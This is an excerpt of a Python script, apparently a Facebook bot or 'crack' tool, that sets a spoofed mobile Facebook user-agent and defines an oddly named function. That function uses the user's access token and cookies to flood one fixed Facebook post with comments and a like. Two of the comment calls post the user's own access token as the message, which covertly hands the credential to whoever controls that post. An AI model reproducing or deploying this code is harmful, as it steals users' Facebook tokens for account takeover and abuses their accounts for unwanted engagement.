...
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36"
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
...
komtwol = random.choice(['ANJAY SLEMEX LORD NIKI GANTENG ', 'MHD.NIKI ', 'BANH KOK LO JAGO BANGET SIH ', 'LORD DAH MAKAN BLM'])
...
def ___fii___Sayang___Kamu___Widiya___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + kom + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)

        requests.post('https://graph.facebook.com/254018450221419/likes?summary=true&access_token=' + (token),cookies=cookie)
